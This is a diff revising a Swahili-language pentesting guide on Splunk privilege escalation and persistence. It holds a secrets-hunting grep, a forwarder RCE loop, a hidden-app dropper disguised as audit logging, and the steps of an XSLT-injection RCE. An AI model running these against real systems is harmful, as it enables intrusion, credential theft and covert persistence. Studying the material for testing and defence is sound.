@@ -1,6 +1,8 @@
-# Splunk LPE and Persistence
+# Splunk LPE na Persistence
 
-Ikiwa unafanya **enumerating** mashine **internally** au **externally** na ukapata **Splunk running** (kwa kawaida **8000** kwa web UI na **8089** kwa management API), credentials valid mara nyingi zinaweza kubadilishwa kuwa **code execution** kupitia usakinishaji wa app, scripted inputs, au management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Ikiwa Splunk inaendesha kama **root**, mara nyingi hilo huwa **privilege escalation** ya moja kwa moja.<sup>[[1]](#references)</sup>
+{{#include ../../banners/hacktricks-training.md}}
+
+Ikiwa wakati wa **enumerating** machine **internally** au **externally** utapata **Splunk running** (kwa kawaida **8000** kwa web UI na **8089** kwa management API), credentials halali mara nyingi zinaweza kutumika kupata **code execution** kupitia app installation, scripted inputs, au management actions.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Ikiwa Splunk inaendeshwa kama **root**, mara nyingi hii huwa **privilege escalation** ya moja kwa moja.<sup>[[1]](#references)</sup>
 
 Ikiwa unahitaji tu generic remote attack surface, enumeration, au app-upload RCE path, angalia:
 
@@ -8,9 +10,9 @@ Ikiwa unahitaji tu generic remote attack surface, enumeration, au app-upload RCE
 ../../network-services-pentesting/8089-splunkd.md
 {{#endref}}
 
-Ikiwa tayari wewe ni **root** na Splunk service haisikilizi localhost pekee, unaweza pia kuiba **Splunk password hashes**, kurejesha **encrypted secrets**, au kusukuma **malicious app** ili kudumisha persistence locally au across multiple forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>
+Ikiwa **tayari wewe ni root** na Splunk service haisikilizi localhost pekee, unaweza pia kuiba **Splunk password hashes**, kurejesha **encrypted secrets**, au kusukuma **malicious app** ili kudumisha persistence locally au across multiple forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>
 
-## Faili za Ndani za Kuvutia
+## Interesting Local Files
 
 Unapofika kwenye host inayoendesha Splunk au Splunk Universal Forwarder, hizi kwa kawaida ndizo paths zinazovutia zaidi:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
 ```bash
@@ -23,37 +25,37 @@ grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLU
 ```
 Artifacts muhimu:
 
-- **`$SPLUNK_HOME/etc/passwd`**: watumiaji wa ndani wa Splunk na password hashes.<sup>[[7]](#references)</sup>
-- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key inayotumiwa na Splunk kusimba secrets zilizohifadhiwa katika faili kadhaa za `.conf`.<sup>[[8]](#references)</sup>
-- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: faili ya awali ya bootstrap ya admin; ni muhimu katika gold images na makosa ya provisioning. Hupuuzwa ikiwa `etc/passwd` tayari ipo.<sup>[[9]](#references)</sup>
-- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mahali ambapo scripted inputs huwezeshwa kwa kawaida.<sup>[[10]](#references)</sup>
-- **`$SPLUNK_HOME/etc/deployment-apps/`** au **`$SPLUNK_HOME/etc/apps/`**: maeneo mazuri ya kuficha persistent app au kukagua kile ambacho tayari kinasambazwa.<sup>[[11]](#references)</sup>
+- **`$SPLUNK_HOME/etc/passwd`**: watumiaji wa Splunk wa local na password hashes.<sup>[[7]](#references)</sup>
+- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: key inayotumiwa na Splunk ku-encrypt secrets zilizohifadhiwa katika faili kadhaa za `.conf`.<sup>[[8]](#references)</sup>
+- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: faili ya awali ya admin bootstrap; ni muhimu katika gold images na makosa ya provisioning. Hupuuzwa ikiwa `etc/passwd` tayari ipo.<sup>[[9]](#references)</sup>
+- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: mahali ambapo scripted inputs huwezeshwa mara nyingi.<sup>[[10]](#references)</sup>
+- **`$SPLUNK_HOME/etc/deployment-apps/`** au **`$SPLUNK_HOME/etc/apps/`**: maeneo mazuri ya kuficha app yenye persistence au kukagua kile ambacho tayari kinadistribute.<sup>[[11]](#references)</sup>
 
-## Muhtasari wa Splunk Universal Forwarder Agent Exploit
+## Muhtasari wa Exploit ya Splunk Universal Forwarder Agent
 
-Kwa maelezo zaidi angalia [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Huu ni muhtasari tu.<sup>[[1]](#references)</sup>
+Kwa maelezo zaidi, angalia [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Huu ni muhtasari tu.<sup>[[1]](#references)</sup>
 
 **Muhtasari wa exploit:**
-Exploit inayolenga Splunk Universal Forwarder (UF) huwawezesha attackers wenye **agent password** kutekeleza arbitrary code kwenye mifumo inayoendesha agent, na hivyo uwezekano wa kuathiri sehemu kubwa ya environment.<sup>[[1]](#references)</sup>
+Exploit inayolenga Splunk Universal Forwarder (UF) huwawezesha attackers walio na **agent password** kutekeleza code kiholela kwenye systems zinazoendesha agent, na huenda wakachukua udhibiti wa sehemu kubwa ya environment.<sup>[[1]](#references)</sup>
 
 **Kwa nini inafanya kazi:**
 
-- Huduma ya usimamizi ya UF kwa kawaida huonekana kwenye **TCP 8089**.<sup>[[6]](#references)</sup>
-- Attackers wanaweza ku-authenticate kwenye API na kuagiza forwarder isakinishe **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
+- UF management service mara nyingi huwekwa wazi kwenye **TCP 8089**.<sup>[[6]](#references)</sup>
+- Attackers wanaweza ku-authenticate kwenye API na kuagiza forwarder i-install **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
 - Primitive hiyo hiyo inaweza kutumiwa locally kwa **LPE** au remotely kwa **RCE**.<sup>[[5]](#references)</sup>
 - Public tooling kama **SplunkWhisperer2** huunda app bundle automatically na inaweza ku-adapt payloads kwa Linux targets.<sup>[[5]](#references)</sup>
 
-**Njia za kawaida za kupata tena password:**
+**Njia za kawaida za kurecover password:**
 
-- Credentials za cleartext katika documentation, scripts, shares, au deployment automation.<sup>[[1]](#references)</sup>
+- Cleartext credentials katika documentation, scripts, shares, au deployment automation.<sup>[[1]](#references)</sup>
 - Password hashes ndani ya `$SPLUNK_HOME/etc/passwd`, zikifuatiwa na offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
-- Golden images au provisioning leftovers kama `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>
+- Golden images au mabaki ya provisioning kama `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>
 
 **Athari:**
 
-- Utekelezaji wa code wa kiwango cha SYSTEM/root kwenye kila host iliyoathiriwa.<sup>[[1]](#references)</sup>
-- Usambazaji wa persistent apps, backdoors, au ransomware.<sup>[[1]](#references)</sup>
-- Kuzima au kuchezea telemetry kabla data haijaforwardiwa.<sup>[[1]](#references)</sup>
+- Code execution ya kiwango cha SYSTEM/root kwenye kila host iliyo-compromise.<sup>[[1]](#references)</sup>
+- Deployment ya apps zenye persistence, backdoors, au ransomware.<sup>[[1]](#references)</sup>
+- Kuzima au ku-tamper na telemetry kabla data haijaforwardiwa.<sup>[[1]](#references)</sup>
 
 **Mfano wa command ya exploitation:**
 
@@ -69,22 +71,22 @@ for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8
 
 ## Persistence kupitia Scripted Inputs au Malicious Apps
 
-Ikiwa una **filesystem write access** kama `root`/`splunk`, au authenticated access ya kusakinisha apps, persistence mechanism inayotegemeka sana ni kuweka **custom app** yenye **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Nyaraka rasmi za Splunk zinatarajia scripted inputs ziwekwe ndani ya directory ya app na ziwezeshwe kutoka `inputs.conf`.<sup>[[10]](#references)</sup>
+Ikiwa una **ufikiaji wa kuandika kwenye filesystem** ukiwa `root`/`splunk`, au ufikiaji uliothibitishwa wa kusakinisha apps, persistence mechanism inayotegemeka sana ni kuweka **custom app** yenye **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Nyaraka za Splunk zenyewe zinatarajia scripted inputs ziwe ndani ya app directory na ziwashwe kutoka `inputs.conf`.<sup>[[10]](#references)</sup>
 
-Muundo wa kawaida:
+Mpangilio wa kawaida:
 ```bash
 /opt/splunk/etc/apps/.linux_audit/
 ├── bin/check.sh
 └── default/inputs.conf
 ```
-`inputs.conf` Ndogo:<sup>[[10]](#references)</sup>
+`inputs.conf` ya chini kabisa:<sup>[[10]](#references)</sup>
 ```ini
 [script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
 disabled = 0
 interval = 60
 sourcetype = auditd
 ```
-Dropper ya haraka ya Linux (ikitumia mpangilio huo wa app ulioandikwa):<sup>[[10]](#references)</sup>
+Dropper ya haraka ya Linux (ikitumia mpangilio huo wa app uliorekodiwa):<sup>[[10]](#references)</sup>
 ```bash
 APP="$SPLUNK_HOME/etc/apps/.linux_audit"
 mkdir -p "$APP/bin" "$APP/default"
@@ -93,19 +95,19 @@ printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0
 chmod +x "$APP/bin/check.sh"
 "$SPLUNK_HOME/bin/splunk" restart
 ```
-Maelezo:
+Vidokezo:
 
-- Mbinu hiyo hiyo inafanya kazi kwenye **Universal Forwarder** kwa kutumia `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
-- Washambuliaji mara nyingi huchanganyika kwa kurekebisha add-on halali badala ya kuunda app inayoonekana wazi kuwa ni hasidi.<sup>[[2]](#references)</sup>
-- Kwenye **deployment server**, kuweka app hasidi ndani ya `deployment-apps/` hugeuka kuwa **fleet-wide persistence** kwa sababu forwarders huuliza mara kwa mara, hupakua apps zilizosasishwa, na mara nyingi hujianzisha upya ili kuzitumia.<sup>[[11]](#references)[[12]](#references)</sup>
+- Ujanja huo huo hufanya kazi kwenye **Universal Forwarder** kwa kutumia `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
+- Attackers mara nyingi hujichanganya kwa kurekebisha add-on halali badala ya kuunda app yenye nia mbaya iliyo wazi.<sup>[[2]](#references)</sup>
+- Kwenye **deployment server**, kupandikiza app yenye nia mbaya ndani ya `deployment-apps/` hugeuka kuwa **fleet-wide persistence** kwa sababu forwarders huuliza mara kwa mara, hupakua apps zilizosasishwa, na mara nyingi hujiwasha upya ili kuzitumia.<sup>[[11]](#references)[[12]](#references)</sup>
 
 ## Wizi wa Credentials na Utekaji wa Admin
 
-Ikiwa unaweza kusoma local files za Splunk, kwa kawaida kuna malengo mawili mazuri: kurejesha **Splunk admin access** na kurejesha **encrypted service credentials**.<sup>[[8]](#references)</sup>
+Ikiwa unaweza kusoma files za ndani za Splunk, kwa kawaida kuna malengo mawili mazuri: kurejesha **Splunk admin access** na kurejesha **encrypted service credentials**.<sup>[[8]](#references)</sup>
 
-### Password hashes na local users
+### Password hashes na users wa ndani
 
-Splunk huhifadhi data ya local authentication kwenye `etc/passwd`. Kulingana na deployment, kuvunja faili hiyo kunaweza kurejesha credentials zinazofanya kazi kwa web UI na management API.<sup>[[1]](#references)[[7]](#references)</sup>
+Splunk huhifadhi data ya local authentication kwenye `etc/passwd`. Kulingana na deployment, kuvunja file hilo kunaweza kurejesha credentials zinazofanya kazi za web UI na management API.<sup>[[1]](#references)[[7]](#references)</sup>
 
 Ikiwa tayari una credentials halali za **admin** na Splunk inatumia backend yake ya **native** authentication, CLI yenyewe inaweza kutumika kwa persistence.<sup>[[13]](#references)</sup>
 ```bash
@@ -116,43 +118,43 @@ Ikiwa tayari una credentials halali za **admin** na Splunk inatumia backend yake
 
 Splunk hutumia `etc/auth/splunk.secret` kulinda values nyeti zilizohifadhiwa katika configuration files nyingi. Ikiwa unaweza kuiba **secret** na **`.conf` files** husika, mara nyingi unaweza kurejesha au kutumia tena:<sup>[[8]](#references)</sup>
 
-- shared secrets za forwarder/indexer kama vile `pass4SymmKey`
-- passwords za TLS private-key kama vile `sslPassword`
-- credentials za LDAP bind kama vile `bindDNPassword`
+- forwarder/indexer shared secrets kama `pass4SymmKey`
+- TLS private-key passwords kama `sslPassword`
+- LDAP bind credentials kama `bindDNPassword`
 
-Hii inaweza kusaidia **lateral movement** hata wakati Splunk admin password yenyewe haiwezi ku-crackiwa.<sup>[[8]](#references)</sup>
+Hii inaweza kusaidia **lateral movement** hata wakati Splunk admin password yenyewe haiwezi kuvunjwa.<sup>[[8]](#references)</sup>
 
 ### Matumizi mabaya ya `user-seed.conf`
 
 `user-seed.conf` hutumiwa tu wakati wa first start au wakati `etc/passwd` haipo. Hilo huifanya isiwe na manufaa sana kwenye live box, lakini iwe ya kuvutia sana katika:<sup>[[9]](#references)</sup>
 
-- installation templates zilizoathiriwa
+- compromised installation templates
 - container images
 - unattended provisioning workflows
 - appliances ambapo Splunk huanzishwa upya automatically
 
 Katika hali hizo, kuweka `HASHED_PASSWORD` iliyotengenezwa kwa `splunk hash-passwd` hukupa njia tulivu ya kurejesha admin access baada ya redeployment.<sup>[[9]](#references)</sup>
 
-## Abusing Splunk Queries
+## Matumizi Mabaya ya Splunk Queries
 
 Kwa maelezo zaidi angalia [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>
 
-Technique muhimu ya hivi karibuni ni kutumia vibaya **user-supplied XSLT** katika Splunk Enterprise versions zilizo katika hatari, ili kubadilisha authenticated account yenye privileges ndogo kuwa **OS command execution** kama user wa `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>
+Mbinu muhimu ya hivi karibuni ni kutumia vibaya **user-supplied XSLT** katika Splunk Enterprise versions zilizo hatarini, ili kubadilisha authenticated account yenye privileges ndogo kuwa **OS command execution** kama user wa `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>
 
-Mtiririko wa jumla:<sup>[[3]](#references)[[4]](#references)</sup>
+Mtiririko wa kiwango cha juu:<sup>[[3]](#references)[[4]](#references)</sup>
 
 1. Authenticate kwenye Splunk.
 2. Upload **XSL** file hasidi kupitia preview/upload functionality.
-3. Fanya Splunk irender search results kwa kutumia stylesheet hiyo iliyopakiwa kutoka kwenye **dispatch** directory.
+3. Fanya Splunk irender search results kwa kutumia uploaded stylesheet kutoka directory ya **dispatch**.
 4. Tumia XSLT payload kuandika file au ku-trigger execution kupitia Splunk's search pipeline (kwa mfano kwa kufikia internal functionality kama `runshellscript`).
 
-Jambo muhimu kwa upande wa offensive ni kwamba njia hii ni **post-auth RCE bila kuhitaji app upload**. Kwenye Linux kwa kawaida inakuweka kwenye **`splunk`** account, ambayo bado ni muhimu kwa sababu user huyo mara nyingi anamiliki application tree, anaweza kusoma secrets, na anaweza kuweka persistent apps zinazodumu hata baada ya shell kupotea.<sup>[[3]](#references)[[4]](#references)</sup>
+Jambo muhimu la kuchukua upande wa offensive ni kwamba njia hii ni **post-auth RCE bila kuhitaji app upload**. Kwenye Linux kwa kawaida utaishia kwenye account ya **`splunk`**, ambayo bado ni muhimu kwa sababu user huyo mara nyingi anamiliki application tree, anaweza kusoma secrets, na anaweza kupanda persistent apps ambazo zitaendelea kuwepo hata shell ikipotea.<sup>[[3]](#references)[[4]](#references)</sup>
 
-Representative path iliyotumika wakati wa exploitation ni:<sup>[[4]](#references)</sup>
+Njia inayotumika kuwakilisha exploitation ni:<sup>[[4]](#references)</sup>
 ```text
 /opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
 ```
-Ikiwa Splunk inaendeshwa ikiwa na privileges nyingi kupita kiasi, au ikiwa user `splunk` ana access ya scripts hatari, service units zinazoweza kuandikwa, au sheria mbaya za `sudo`, hii huwa chain safi ya **LPE**.
+Ikiwa Splunk inaendeshwa ikiwa na privileges nyingi kupita kiasi, au ikiwa user `splunk` anaweza kufikia scripts hatari, service units zinazoweza kuandikwa, au sheria mbaya za `sudo`, hii huwa chain safi ya **LPE**.
 
 ## References
 
@@ -161,7 +163,7 @@ Ikiwa Splunk inaendeshwa ikiwa na privileges nyingi kupita kiasi, au ikiwa user 
 - [3] [Ushauri wa Usalama wa Splunk SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
 - [4] [Uchambuzi wa CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
 - [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
-- [6] [Kubadilisha thamani chaguo-msingi](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
+- [6] [Kubadilisha thamani za default](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
 - [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
 - [8] [Kusambaza passwords salama kwenye servers nyingi](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
 - [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
